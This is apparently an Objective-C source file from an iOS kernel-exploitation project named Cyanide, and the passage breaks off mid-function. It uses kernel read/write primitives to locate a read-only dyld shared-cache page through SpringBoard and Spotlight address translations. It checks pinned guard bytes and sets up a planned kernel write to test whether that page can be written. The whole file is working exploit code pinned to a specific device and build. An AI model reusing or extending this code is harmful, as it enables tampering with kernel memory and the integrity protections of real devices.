//
//  CNDHailMaryReadOnlyDataPage.m
//  Cyanide
//

#import "CNDHailMaryReadOnlyDataPage.h"

#import "CNDHailMaryDataPage.h"
#import "CNDHailMaryImpRedirect.h"
#import "CNDHailMaryPatch.h"
#import "CNDHailMaryProbe.h"
#import "kexploit/kexploit_opa334.h"
#import "kexploit/krw.h"

#import <CommonCrypto/CommonDigest.h>
#import <errno.h>
#import <fcntl.h>
#import <string.h>
#import <unistd.h>

#define CND_HAIL_MARY_RO_DATA_BUILD "23A341"
#define CND_HAIL_MARY_RO_DATA_PRODUCT "iPhone17,2"
#define CND_HAIL_MARY_RO_DATA_SUBCACHE_UUID \
    "CEEB0D68-9BA9-3CC8-AEB1-8F23BAC92B58"
#define CND_HAIL_MARY_RO_DATA_GUARD_SHA256 \
    "81c8a106d2a9e37a93d17d78dc7c54ea3b0ec4f036458a15e2ec1e4403d33677"
#define CND_HAIL_MARY_RO_DATA_GUARD_HEX \
    "c7f5e30b0008c40200000000c0ffffff0323ed0b0000cc1600000000c0ffffff"
#define CND_HAIL_MARY_RO_DATA_REDIRECTED_GUARD_SHA256 \
    "4ed8147447733303d0ae8043da89d2634f01af11c671540f8268a22d4dba906f"
#define CND_HAIL_MARY_RO_DATA_REDIRECTED_GUARD_HEX \
    "baece30b0008c40200000000c0ffffff0323ed0b0000cc1600000000c0ffffff"
#define CND_HAIL_MARY_RO_DATA_TEXT_GUARD_SHA256 \
    "542063d6c8ea82afbe734ace1895ba0f2b7ab15160c6053176604644741f20d5"

static const uint64_t kCNDHailMaryRODataPageSize = UINT64_C(0x4000);
static const uint64_t kCNDHailMaryRODataSharedRegionBase =
    UINT64_C(0x180000000);
static const uint64_t kCNDHailMaryRODataMaximumSlide =
    UINT64_C(0x40000000);
static const uint64_t kCNDHailMaryRODataEntryUnslid =
    UINT64_C(0x1ffc27458);
static const uint64_t kCNDHailMaryRODataSubcacheFileOffset =
    UINT64_C(0x78d3458);
static const uint64_t kCNDHailMaryRODataOriginalEntry =
    UINT64_C(0x02c408000be3f5c7);
static const uint64_t kCNDHailMaryRODataRedirectedEntry =
    UINT64_C(0x02c408000be3ecba);
static const uint32_t kCNDHailMaryRODataOriginalFirstWord =
    UINT32_C(0x0be3f5c7);
static const size_t kCNDHailMaryRODataGuardLength = 32;
static const uint32_t kCNDHailMaryRODataInitProtection = 1;
static const uint32_t kCNDHailMaryRODataMaximumProtection = 1;

static volatile int gCNDHailMaryRODataRunning;

static NSString *CNDHailMaryRODataHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
        (unsigned long long)value];
}

static BOOL CNDHailMaryRODataParseHex(NSString *text, uint64_t *valueOut)
{
    if (![text isKindOfClass:NSString.class] ||
        ![text hasPrefix:@"0x"] || text.length <= 2) {
        return NO;
    }
    NSScanner *scanner = [NSScanner scannerWithString:
        [text substringFromIndex:2]];
    unsigned long long value = 0;
    if (![scanner scanHexLongLong:&value] || !scanner.isAtEnd) return NO;
    if (valueOut) *valueOut = (uint64_t)value;
    return YES;
}

static NSData *CNDHailMaryRODataFromHex(NSString *text)
{
    if (![text isKindOfClass:NSString.class] || text.length % 2 != 0) {
        return nil;
    }
    NSMutableData *data = [NSMutableData dataWithLength:text.length / 2];
    uint8_t *bytes = data.mutableBytes;
    for (NSUInteger index = 0; index < text.length; index += 2) {
        NSString *pair = [text substringWithRange:NSMakeRange(index, 2)];
        NSScanner *scanner = [NSScanner scannerWithString:pair];
        unsigned int value = 0;
        if (![scanner scanHexInt:&value] || !scanner.isAtEnd) return nil;
        bytes[index / 2] = (uint8_t)value;
    }
    return data;
}

static NSString *CNDHailMaryRODataBytesHex(const void *bytes, size_t length)
{
    if (!bytes || length == 0) return @"";
    const uint8_t *cursor = bytes;
    NSMutableString *hex = [NSMutableString stringWithCapacity:length * 2];
    for (size_t index = 0; index < length; index++) {
        [hex appendFormat:@"%02x", cursor[index]];
    }
    return hex;
}

static NSString *CNDHailMaryRODataSHA256(NSData *data)
{
    if (![data isKindOfClass:NSData.class] || data.length == 0 ||
        data.length > UINT32_MAX) {
        return @"";
    }
    unsigned char digest[CC_SHA256_DIGEST_LENGTH] = {0};
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
    return CNDHailMaryRODataBytesHex(digest, sizeof(digest));
}

static NSString *CNDHailMaryRODataReportPath(void)
{
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    return [directory stringByAppendingPathComponent:
        @"CNDHailMaryReadOnlyDataPage.json"];
}

static void CNDHailMaryRODataSave(
    NSDictionary<NSString *, id> *report, NSString *path)
{
    if (!report || path.length == 0) return;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
                                                    options:NSJSONWritingPrettyPrinted |
                                                            NSJSONWritingSortedKeys
                                                      error:nil];
    if (data) {
        (void)[data writeToFile:path options:NSDataWritingAtomic error:nil];
    }
}

static BOOL CNDHailMaryRODataSyncFileDescriptor(int descriptor)
{
    if (descriptor < 0) return NO;
#ifdef F_FULLFSYNC
    if (fcntl(descriptor, F_FULLFSYNC) == 0) return YES;
#endif
    return fsync(descriptor) == 0;
}

static BOOL CNDHailMaryRODataSaveDurably(
    NSDictionary<NSString *, id> *report,
    NSString *path,
    NSString **errorOut)
{
    if (!report || path.length == 0) {
        if (errorOut) *errorOut = @"journal-path-invalid";
        return NO;
    }
    NSError *serializationError = nil;
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
                                                    options:NSJSONWritingPrettyPrinted |
                                                            NSJSONWritingSortedKeys
                                                      error:&serializationError];
    if (!data) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"journal-serialization-failed:%@",
            serializationError.localizedDescription ?: @"unknown"];
        return NO;
    }
    NSError *writeError = nil;
    if (![data writeToFile:path
                    options:NSDataWritingAtomic
                      error:&writeError]) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"journal-atomic-write-failed:%@",
            writeError.localizedDescription ?: @"unknown"];
        return NO;
    }

    int fileDescriptor = open(path.fileSystemRepresentation,
                              O_RDONLY | O_CLOEXEC);
    if (fileDescriptor < 0) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"journal-open-failed:%d", errno];
        return NO;
    }
    BOOL fileSynced = CNDHailMaryRODataSyncFileDescriptor(fileDescriptor);
    int fileSyncError = fileSynced ? 0 : errno;
    close(fileDescriptor);
    if (!fileSynced) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"journal-file-sync-failed:%d", fileSyncError];
        return NO;
    }

    NSString *directory = path.stringByDeletingLastPathComponent;
    int directoryDescriptor = open(directory.fileSystemRepresentation,
                                   O_RDONLY | O_CLOEXEC);
    if (directoryDescriptor < 0) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"journal-directory-open-failed:%d", errno];
        return NO;
    }
    BOOL directorySynced = fsync(directoryDescriptor) == 0;
    int directorySyncError = directorySynced ? 0 : errno;
    close(directoryDescriptor);
    if (!directorySynced) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"journal-directory-sync-failed:%d", directorySyncError];
        return NO;
    }
    return YES;
}

static void CNDHailMaryRODataFinish(
    NSMutableDictionary<NSString *, id> *report,
    CNDHailMaryReadOnlyDataPageCompletion completion)
{
    NSString *path = report[@"reportPath"];
    CNDHailMaryRODataSave(report, path);
    NSDictionary<NSString *, id> *finished = [report copy];
    __sync_lock_release(&gCNDHailMaryRODataRunning);
    dispatch_async(dispatch_get_main_queue(), ^{
        completion(finished);
    });
}

static BOOL CNDHailMaryRODataAddSlideCandidate(
    NSMutableArray<NSMutableDictionary<NSString *, id> *> *candidates,
    NSString *text,
    NSString *source,
    NSString **errorOut)
{
    uint64_t slide = 0;
    if (!CNDHailMaryRODataParseHex(text, &slide) ||
        slide > kCNDHailMaryRODataMaximumSlide ||
        (slide & (kCNDHailMaryRODataPageSize - 1)) != 0) {
        if (errorOut) {
            *errorOut = [NSString stringWithFormat:
                @"invalid-live-slide-anchor:%@", source ?: @"unknown"];
        }
        return NO;
    }
    for (NSMutableDictionary<NSString *, id> *candidate in candidates) {
        if ([candidate[@"slide"] unsignedLongLongValue] == slide) {
            NSMutableArray<NSString *> *sources = candidate[@"sources"];
            [sources addObject:source ?: @"unknown"];
            return YES;
        }
    }
    [candidates addObject:[@{
        @"slide": @(slide),
        @"sources": [NSMutableArray arrayWithObject:source ?: @"unknown"],
    } mutableCopy]];
    return YES;
}

BOOL CNDHailMaryReadOnlyDataPageResolveDispatchEntry(
    NSDictionary<NSString *, id> *probeReport,
    BOOL expectRedirected,
    NSDictionary<NSString *, id> **contextOut,
    NSData **guardDataOut,
    NSString **errorOut)
{
    if (contextOut) *contextOut = nil;
    if (guardDataOut) *guardDataOut = nil;
    if (errorOut) *errorOut = nil;

    if (![probeReport isKindOfClass:NSDictionary.class]) {
        if (errorOut) *errorOut = @"confirmed-original-text-proof-required";
        return NO;
    }
    id objectCandidate = probeReport[@"objectBackingComparison"];
    id physicalCandidate = probeReport[@"physicalPageProof"];
    if (![objectCandidate isKindOfClass:NSDictionary.class] ||
        ![physicalCandidate isKindOfClass:NSDictionary.class]) {
        if (errorOut) *errorOut = @"confirmed-original-text-proof-required";
        return NO;
    }
    NSDictionary<NSString *, id> *objectProof = objectCandidate;
    NSDictionary<NSString *, id> *physicalProof = physicalCandidate;
    id textGuardCandidate = physicalProof[@"guard"];
    if (![textGuardCandidate isKindOfClass:NSDictionary.class]) {
        if (errorOut) *errorOut = @"confirmed-original-text-proof-required";
        return NO;
    }
    NSDictionary<NSString *, id> *textGuard = textGuardCandidate;
    if ([probeReport[@"schemaVersion"] unsignedIntegerValue] != 2 ||
        ![probeReport[@"probe"] isEqual:@"hail-mary-physical-page-proof"] ||
        ![probeReport[@"productType"] isEqual:@CND_HAIL_MARY_RO_DATA_PRODUCT] ||
        ![probeReport[@"productBuildVersion"]
            isEqual:@CND_HAIL_MARY_RO_DATA_BUILD] ||
        ![objectProof[@"confirmed"] boolValue] ||
        ![physicalProof[@"confirmed"] boolValue] ||
        ![physicalProof[@"postReadTranslationStable"] boolValue] ||
        ![textGuard[@"sha256Matches"] boolValue] ||
        ![textGuard[@"instructionWordMatches"] boolValue] ||
        [textGuard[@"byteLength"] unsignedIntegerValue] != 188 ||
        ![[textGuard[@"sha256"] lowercaseString]
            isEqual:@CND_HAIL_MARY_RO_DATA_TEXT_GUARD_SHA256]) {
        if (errorOut) *errorOut = @"confirmed-original-text-proof-required";
        return NO;
    }

    NSString *expectedHex = expectRedirected
        ? @CND_HAIL_MARY_RO_DATA_REDIRECTED_GUARD_HEX
        : @CND_HAIL_MARY_RO_DATA_GUARD_HEX;
    NSString *expectedSHA = expectRedirected
        ? @CND_HAIL_MARY_RO_DATA_REDIRECTED_GUARD_SHA256
        : @CND_HAIL_MARY_RO_DATA_GUARD_SHA256;
    uint64_t expectedEntry = expectRedirected
        ? kCNDHailMaryRODataRedirectedEntry
        : kCNDHailMaryRODataOriginalEntry;
    NSData *expectedGuard = CNDHailMaryRODataFromHex(expectedHex);
    uint64_t compiledEntry = 0;
    if (expectedGuard.length != kCNDHailMaryRODataGuardLength ||
        ![[CNDHailMaryRODataSHA256(expectedGuard) lowercaseString]
            isEqual:expectedSHA]) {
        if (errorOut) *errorOut = @"compiled-dispatch-guard-invalid";
        return NO;
    }
    memcpy(&compiledEntry, expectedGuard.bytes, sizeof(compiledEntry));
    if (compiledEntry != expectedEntry || EARLY_KRW_LENGTH !=
            kCNDHailMaryRODataGuardLength) {
        if (errorOut) *errorOut = @"compiled-dispatch-entry-invalid";
        return NO;
    }

    NSMutableArray<NSMutableDictionary<NSString *, id> *> *candidates =
        [NSMutableArray array];
    id springProcessCandidate = probeReport[@"springBoard"];
    id spotlightProcessCandidate = probeReport[@"spotlight"];
    id objectSpringCandidate = objectProof[@"springBoard"];
    id objectSpotlightCandidate = objectProof[@"spotlight"];
    if (![springProcessCandidate isKindOfClass:NSDictionary.class] ||
        ![spotlightProcessCandidate isKindOfClass:NSDictionary.class] ||
        ![objectSpringCandidate isKindOfClass:NSDictionary.class] ||
        ![objectSpotlightCandidate isKindOfClass:NSDictionary.class]) {
        if (errorOut) *errorOut = @"live-slide-anchors-invalid";
        return NO;
    }
    NSDictionary<NSString *, id> *springProcess = springProcessCandidate;
    NSDictionary<NSString *, id> *spotlightProcess =
        spotlightProcessCandidate;
    NSDictionary<NSString *, id> *objectSpring = objectSpringCandidate;
    NSDictionary<NSString *, id> *objectSpotlight =
        objectSpotlightCandidate;
    NSArray<NSString *> *slideTexts = @[
        springProcess[@"sharedCacheSlide"] ?: @"",
        spotlightProcess[@"sharedCacheSlide"] ?: @"",
        objectSpring[@"slide"] ?: @"",
        objectSpotlight[@"slide"] ?: @"",
    ];
    NSArray<NSString *> *slideSources = @[
        @"springBoard.sharedCacheSlide",
        @"spotlight.sharedCacheSlide",
        @"objectBackingComparison.springBoard.slide",
        @"objectBackingComparison.spotlight.slide",
    ];
    for (NSUInteger index = 0; index < slideTexts.count; index++) {
        NSString *candidateError = nil;
        if (!CNDHailMaryRODataAddSlideCandidate(
                candidates, slideTexts[index], slideSources[index],
                &candidateError)) {
            if (errorOut) *errorOut = candidateError ?:
                @"invalid-live-slide-anchor";
            return NO;
        }
    }
    if (candidates.count == 0 || candidates.count > 4) {
        if (errorOut) *errorOut = @"bounded-live-slide-candidates-required";
        return NO;
    }

    uint64_t guardedTextFrame = 0;
    if (!CNDHailMaryRODataParseHex(
            physicalProof[@"physicalFrame"], &guardedTextFrame) ||
        guardedTextFrame == 0) {
        if (errorOut) *errorOut = @"guarded-text-frame-invalid";
        return NO;
    }

    uint64_t expectedOffset = kCNDHailMaryRODataEntryUnslid &
        (kCNDHailMaryRODataPageSize - 1);
    NSMutableArray<NSDictionary<NSString *, id> *> *attempts =
        [NSMutableArray arrayWithCapacity:candidates.count];
    NSMutableArray<NSDictionary<NSString *, id> *> *matches =
        [NSMutableArray array];
    for (NSDictionary<NSString *, id> *candidate in candidates) {
        uint64_t slide = [candidate[@"slide"] unsignedLongLongValue];
        if (slide > UINT64_MAX - kCNDHailMaryRODataEntryUnslid) {
            [attempts addObject:@{
                @"slide": CNDHailMaryRODataHex(slide),
                @"translated": @NO,
                @"error": @"runtime-address-overflow",
            }];
            continue;
        }
        uint64_t runtimeAddress = kCNDHailMaryRODataEntryUnslid + slide;
        NSDictionary<NSString *, id> *springTranslation = nil;
        NSDictionary<NSString *, id> *spotlightTranslation = nil;
        uint64_t physicalFrame = 0;
        uint64_t physicalAddress = 0;
        uint64_t frameKVA = 0;
        NSString *translationError = nil;
        if (!CNDHailMaryProbeTranslateSharedRuntimeAddress(
                probeReport, runtimeAddress,
                &springTranslation, &spotlightTranslation,
                &physicalFrame, &physicalAddress, &frameKVA,
                &translationError) ||
            !springTranslation || !spotlightTranslation ||
            physicalFrame == 0 || physicalFrame == guardedTextFrame ||
            physicalAddress < physicalFrame ||
            physicalAddress - physicalFrame != expectedOffset ||
            !is_kaddr_valid(frameKVA) ||
            expectedOffset >
                kCNDHailMaryRODataPageSize - EARLY_KRW_LENGTH) {
            [attempts addObject:@{
                @"slide": CNDHailMaryRODataHex(slide),
                @"runtimeAddress": CNDHailMaryRODataHex(runtimeAddress),
                @"translated": @NO,
                @"error": translationError ?:
                    @"shared-frame-translation-invalid",
            }];
            continue;
        }

        uint64_t windowKVA = frameKVA + expectedOffset;
        uint8_t bytes[EARLY_KRW_LENGTH] = {0};
        kreadbuf(windowKVA, bytes, sizeof(bytes));
        NSData *data = [NSData dataWithBytes:bytes length:sizeof(bytes)];
        NSString *sha = CNDHailMaryRODataSHA256(data);
        uint64_t entry = 0;
        memcpy(&entry, bytes, sizeof(entry));
        BOOL exactBytes = [data isEqualToData:expectedGuard];
        BOOL exactSHA = [[sha lowercaseString] isEqual:expectedSHA];
        NSDictionary<NSString *, id> *attempt = @{
            @"slide": CNDHailMaryRODataHex(slide),
            @"sources": candidate[@"sources"] ?: @[],
            @"runtimeAddress": CNDHailMaryRODataHex(runtimeAddress),
            @"translated": @YES,
            @"physicalFrame": CNDHailMaryRODataHex(physicalFrame),
            @"physicalAddress": CNDHailMaryRODataHex(physicalAddress),
            @"frameKernelVirtualAddress": CNDHailMaryRODataHex(frameKVA),
            @"windowKernelVirtualAddress": CNDHailMaryRODataHex(windowKVA),
            @"bytesHex": CNDHailMaryRODataBytesHex(bytes, sizeof(bytes)),
            @"sha256": sha,
            @"entryValue": CNDHailMaryRODataHex(entry),
            @"exactBytesMatch": @(exactBytes),
            @"exactSHA256Match": @(exactSHA),
        };
        [attempts addObject:attempt];
        if (exactBytes && exactSHA && entry == expectedEntry) {
            [matches addObject:@{
                @"slide": @(slide),
                @"runtimeAddress": @(runtimeAddress),
                @"physicalFrame": @(physicalFrame),
                @"physicalAddress": @(physicalAddress),
                @"frameKVA": @(frameKVA),
                @"windowKVA": @(windowKVA),
                @"springBoard": springTranslation,
                @"spotlight": spotlightTranslation,
                @"sources": candidate[@"sources"] ?: @[],
            }];
        }
    }
    if (matches.count != 1) {
        if (errorOut) *errorOut = matches.count == 0
            ? @"dispatch-entry-guard-not-found"
            : @"dispatch-entry-guard-ambiguous";
        return NO;
    }

    NSDictionary<NSString *, id> *match = matches.firstObject;
    uint64_t slide = [match[@"slide"] unsignedLongLongValue];
    uint64_t runtimeAddress =
        [match[@"runtimeAddress"] unsignedLongLongValue];
    uint64_t physicalFrame =
        [match[@"physicalFrame"] unsignedLongLongValue];
    uint64_t physicalAddress =
        [match[@"physicalAddress"] unsignedLongLongValue];
    uint64_t frameKVA = [match[@"frameKVA"] unsignedLongLongValue];
    uint64_t windowKVA = [match[@"windowKVA"] unsignedLongLongValue];
    NSDictionary<NSString *, id> *finalSpring = nil;
    NSDictionary<NSString *, id> *finalSpotlight = nil;
    uint64_t finalFrame = 0;
    uint64_t finalPhysical = 0;
    uint64_t finalFrameKVA = 0;
    NSString *finalError = nil;
    if (!CNDHailMaryProbeTranslateSharedRuntimeAddress(
            probeReport, runtimeAddress,
            &finalSpring, &finalSpotlight,
            &finalFrame, &finalPhysical, &finalFrameKVA,
            &finalError) ||
        finalFrame != physicalFrame || finalPhysical != physicalAddress ||
        finalFrameKVA != frameKVA) {
        if (errorOut) *errorOut = finalError ?:
            @"final-dispatch-translation-changed";
        return NO;
    }

    uint8_t finalBytes[EARLY_KRW_LENGTH] = {0};
    kreadbuf(windowKVA, finalBytes, sizeof(finalBytes));
    NSData *finalData = [NSData dataWithBytes:finalBytes
                                        length:sizeof(finalBytes)];
    uint64_t finalEntry = 0;
    memcpy(&finalEntry, finalBytes, sizeof(finalEntry));
    if (![finalData isEqualToData:expectedGuard] ||
        ![[CNDHailMaryRODataSHA256(finalData) lowercaseString]
            isEqual:expectedSHA] ||
        finalEntry != expectedEntry) {
        if (errorOut) *errorOut = @"final-dispatch-guard-changed";
        return NO;
    }

    NSMutableArray<NSDictionary<NSString *, id> *> *candidateSummary =
        [NSMutableArray arrayWithCapacity:candidates.count];
    for (NSDictionary<NSString *, id> *candidate in candidates) {
        [candidateSummary addObject:@{
            @"slide": CNDHailMaryRODataHex(
                [candidate[@"slide"] unsignedLongLongValue]),
            @"sources": candidate[@"sources"] ?: @[],
        }];
    }
    NSDictionary<NSString *, id> *context = @{
        @"state": expectRedirected ? @"redirected" : @"original",
        @"runtimeVerified": @YES,
        @"unslidEntryVirtualAddress": CNDHailMaryRODataHex(
            kCNDHailMaryRODataEntryUnslid),
        @"sharedCacheSlide": CNDHailMaryRODataHex(slide),
        @"runtimeEntryVirtualAddress": CNDHailMaryRODataHex(runtimeAddress),
        @"physicalFrame": CNDHailMaryRODataHex(physicalFrame),
        @"physicalAddress": CNDHailMaryRODataHex(physicalAddress),
        @"frameKernelVirtualAddress": CNDHailMaryRODataHex(frameKVA),
        @"windowKernelVirtualAddress": CNDHailMaryRODataHex(windowKVA),
        @"offsetWithinFrame": CNDHailMaryRODataHex(expectedOffset),
        @"guardedTextPhysicalFrame": CNDHailMaryRODataHex(
            guardedTextFrame),
        @"entryValue": CNDHailMaryRODataHex(expectedEntry),
        @"guardBytesHex": expectedHex,
        @"guardSHA256": expectedSHA,
        @"springBoard": finalSpring,
        @"spotlight": finalSpotlight,
        @"springBoardPID": springProcess[@"pid"] ?: @0,
        @"springBoardProc": springProcess[@"proc"] ?: @"",
        @"springBoardTask": springProcess[@"task"] ?: @"",
        @"spotlightPID": spotlightProcess[@"pid"] ?: @0,
        @"spotlightProc": spotlightProcess[@"proc"] ?: @"",
        @"spotlightTask": spotlightProcess[@"task"] ?: @"",
        @"slideScan": @{
            @"strategy": @"deduplicated-live-proof-anchors",
            @"candidateCount": @(candidates.count),
            @"matchingCandidateCount": @1,
            @"candidates": candidateSummary,
            @"attempts": attempts,
        },
    };
    if (contextOut) *contextOut = context;
    if (guardDataOut) *guardDataOut = finalData;
    return YES;
}

BOOL CNDHailMaryReadOnlyDataPageIsSupported(NSString **reasonOut)
{
    return CNDHailMaryProbeIsSupported(reasonOut);
}

BOOL CNDHailMaryReadOnlyDataPageIsRunning(void)
{
    return __sync_fetch_and_add(&gCNDHailMaryRODataRunning, 0) != 0;
}

void CNDHailMaryReadOnlyDataPageRun(
    CNDHailMaryReadOnlyDataPageCompletion completion)
{
    if (!completion) return;
    if (!__sync_bool_compare_and_swap(&gCNDHailMaryRODataRunning, 0, 1)) {
        completion(@{
            @"confirmed": @NO,
            @"result": @"refused-already-running",
            @"message": @"The Hail Mary .34 read-only-data experiment is already running.",
        });
        return;
    }

    NSString *reportPath = CNDHailMaryRODataReportPath();
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schemaVersion": @1,
        @"experiment": @"hail-mary-read-only-data-page-aperture-writability",
        @"mode": @"identical-bytes-noop",
        @"productType": @CND_HAIL_MARY_RO_DATA_PRODUCT,
        @"productBuildVersion": @CND_HAIL_MARY_RO_DATA_BUILD,
        @"reportPath": reportPath,
        @"startedAtUnixTime": @([[NSDate date] timeIntervalSince1970]),
        @"confirmed": @NO,
        @"kernelWritePrimitiveInvocationCount": @0,
        @"kernelWritePrimitiveInvocationCountPlanned": @1,
        @"semanticMutationCount": @0,
        @"targetProcessDirectMutationCount": @0,
        @"fallbackAttempted": @NO,
        @"expected": @{
            @"subcacheFileName": @"dyld_shared_cache_arm64e.34.dyldreadonly",
            @"subcacheUUID": @CND_HAIL_MARY_RO_DATA_SUBCACHE_UUID,
            @"mappingName": @"__LINKEDIT",
            @"mappingFlags": @32,
            @"mappingInitProtection": @(kCNDHailMaryRODataInitProtection),
            @"mappingMaximumProtection": @(kCNDHailMaryRODataMaximumProtection),
            @"unslidEntryVirtualAddress": CNDHailMaryRODataHex(
                kCNDHailMaryRODataEntryUnslid),
            @"entryOffsetWithinFrame": CNDHailMaryRODataHex(
                kCNDHailMaryRODataEntryUnslid &
                (kCNDHailMaryRODataPageSize - 1)),
            @"subcacheFileOffset": CNDHailMaryRODataHex(
                kCNDHailMaryRODataSubcacheFileOffset),
            @"originalEntryValue": CNDHailMaryRODataHex(
                kCNDHailMaryRODataOriginalEntry),
            @"originalFirstWord": CNDHailMaryRODataHex(
                kCNDHailMaryRODataOriginalFirstWord),
            @"guardByteLength": @(kCNDHailMaryRODataGuardLength),
            @"originalGuardBytesHex": @CND_HAIL_MARY_RO_DATA_GUARD_HEX,
            @"originalGuardSHA256": @CND_HAIL_MARY_RO_DATA_GUARD_SHA256,
            @"pageSize": @(kCNDHailMaryRODataPageSize),
            @"transportWindowBytes": @(EARLY_KRW_LENGTH),
        },
    } mutableCopy];

    NSString *supportReason = nil;
    if (!CNDHailMaryReadOnlyDataPageIsSupported(&supportReason)) {
        report[@"result"] = @"refused-unsupported-device";
        report[@"message"] = supportReason ?: @"Unsupported device.";
        CNDHailMaryRODataFinish(report, completion);
        return;
    }
    if (CNDHailMaryProbeIsRunning() || CNDHailMaryPatchIsRunning() ||
        CNDHailMaryDataPageIsRunning() ||
        CNDHailMaryImpRedirectIsRunning()) {
        report[@"result"] = @"refused-conflicting-hail-mary-experiment";
        report[@"message"] = @"Another Hail Mary proof or mutation experiment is already running.";
        CNDHailMaryRODataFinish(report, completion);
        return;
    }
    if (!kexploit_krw_ready()) {
        report[@"result"] = @"refused-krw-unavailable";
        report[@"message"] = @"Validated KRW is required before the .34 read-only-data experiment.";
        CNDHailMaryRODataFinish(report, completion);
        return;
    }

    CNDHailMaryProbeRun(^(NSDictionary<NSString *, id> *probeReport) {
        dispatch_async(dispatch_get_global_queue(
            QOS_CLASS_USER_INITIATED, 0), ^{
            report[@"preflightProbe"] = probeReport ?: @{};

            NSDictionary<NSString *, id> *objectProof =
                probeReport[@"objectBackingComparison"];
            NSDictionary<NSString *, id> *physicalProof =
                probeReport[@"physicalPageProof"];
            NSDictionary<NSString *, id> *textGuard =
                physicalProof[@"guard"];
            if (![objectProof isKindOfClass:NSDictionary.class] ||
                ![objectProof[@"confirmed"] boolValue] ||
                ![physicalProof isKindOfClass:NSDictionary.class] ||
                ![physicalProof[@"confirmed"] boolValue] ||
                ![physicalProof[@"postReadTranslationStable"] boolValue] ||
                ![textGuard isKindOfClass:NSDictionary.class] ||
                ![textGuard[@"sha256Matches"] boolValue] ||
                ![textGuard[@"instructionWordMatches"] boolValue] ||
                [textGuard[@"byteLength"] unsignedIntegerValue] != 188 ||
                ![[textGuard[@"sha256"] lowercaseString]
                    isEqual:@CND_HAIL_MARY_RO_DATA_TEXT_GUARD_SHA256]) {
                report[@"result"] = @"preflight-refused";
                report[@"message"] = @"A confirmed physical-page proof with the exact original text guard was not available.";
                CNDHailMaryRODataFinish(report, completion);
                return;
            }

            NSData *expectedGuard = CNDHailMaryRODataFromHex(
                @CND_HAIL_MARY_RO_DATA_GUARD_HEX);
            uint64_t expectedEntry = 0;
            uint32_t expectedFirstWord = 0;
            if (expectedGuard.length != kCNDHailMaryRODataGuardLength ||
                ![[CNDHailMaryRODataSHA256(expectedGuard) lowercaseString]
                    isEqual:@CND_HAIL_MARY_RO_DATA_GUARD_SHA256]) {
                report[@"result"] = @"offline-guard-self-check-failed";
                report[@"message"] = @"The compiled .34 guard bytes did not match their pinned SHA-256.";
                CNDHailMaryRODataFinish(report, completion);
                return;
            }
            memcpy(&expectedEntry, expectedGuard.bytes,
                   sizeof(expectedEntry));
            memcpy(&expectedFirstWord, expectedGuard.bytes,
                   sizeof(expectedFirstWord));
            if (expectedEntry != kCNDHailMaryRODataOriginalEntry ||
                expectedFirstWord != kCNDHailMaryRODataOriginalFirstWord ||
                (kCNDHailMaryRODataEntryUnslid &
                    (kCNDHailMaryRODataPageSize - 1)) != UINT64_C(0x3458) ||
                kCNDHailMaryRODataEntryUnslid <
                    kCNDHailMaryRODataSharedRegionBase ||
                EARLY_KRW_LENGTH != kCNDHailMaryRODataGuardLength) {
                report[@"result"] = @"offline-entry-self-check-failed";
                report[@"message"] = @"The compiled dispatch entry, frame offset, or transport length did not match the offline derivation.";
                CNDHailMaryRODataFinish(report, completion);
                return;
            }

            report[@"stage"] = @"collecting-live-slide-candidates";
            NSMutableArray<NSMutableDictionary<NSString *, id> *> *candidates =
                [NSMutableArray array];
            NSString *candidateError = nil;
            NSArray<NSString *> *slideTexts = @[
                probeReport[@"springBoard"][@"sharedCacheSlide"] ?: @"",
                probeReport[@"spotlight"][@"sharedCacheSlide"] ?: @"",
                objectProof[@"springBoard"][@"slide"] ?: @"",
                objectProof[@"spotlight"][@"slide"] ?: @"",
            ];
            NSArray<NSString *> *slideSources = @[
                @"springBoard.sharedCacheSlide",
                @"spotlight.sharedCacheSlide",
                @"objectBackingComparison.springBoard.slide",
                @"objectBackingComparison.spotlight.slide",
            ];
            for (NSUInteger index = 0; index < slideTexts.count; index++) {
                if (!CNDHailMaryRODataAddSlideCandidate(
                        candidates, slideTexts[index], slideSources[index],
                        &candidateError)) {
                    report[@"result"] = @"preflight-refused";
                    report[@"message"] = candidateError ?:
                        @"A required live slide anchor was invalid.";
                    CNDHailMaryRODataFinish(report, completion);
                    return;
                }
            }
            if (candidates.count == 0 || candidates.count > 4) {
                report[@"result"] = @"preflight-refused";
                report[@"message"] = @"No bounded live slide candidates were available.";
                CNDHailMaryRODataFinish(report, completion);
                return;
            }

            uint64_t guardedTextPhysicalFrame = 0;
            if (!CNDHailMaryRODataParseHex(
                    physicalProof[@"physicalFrame"],
                    &guardedTextPhysicalFrame) ||
                guardedTextPhysicalFrame == 0) {
                report[@"result"] = @"preflight-refused";
                report[@"message"] = @"The confirmed text proof did not preserve its physical-frame identity.";
                CNDHailMaryRODataFinish(report, completion);
                return;
            }

            NSMutableArray<NSDictionary<NSString *, id> *> *candidateSummary =
                [NSMutableArray arrayWithCapacity:candidates.count];
            for (NSDictionary<NSString *, id> *candidate in candidates) {
                uint64_t slide = [candidate[@"slide"] unsignedLongLongValue];
                [candidateSummary addObject:@{
                    @"slide": CNDHailMaryRODataHex(slide),
                    @"sources": candidate[@"sources"] ?: @[],
                }];
            }
            report[@"slideScan"] = [@{
                @"strategy": @"deduplicated-live-proof-anchors",
                @"maximumCandidates": @4,
                @"candidateCount": @(candidates.count),
                @"candidates": candidateSummary,
                @"offlineAddressNotTreatedAsRuntime": @YES,
                @"exactGuardRequired": @YES,
            } mutableCopy];

            report[@"stage"] = @"scanning-live-slide-candidates";
            NSMutableArray<NSDictionary<NSString *, id> *> *attempts =
                [NSMutableArray arrayWithCapacity:candidates.count];
            NSMutableArray<NSDictionary<NSString *, id> *> *matches =
                [NSMutableArray array];
            uint64_t expectedOffset = kCNDHailMaryRODataEntryUnslid &
                (kCNDHailMaryRODataPageSize - 1);
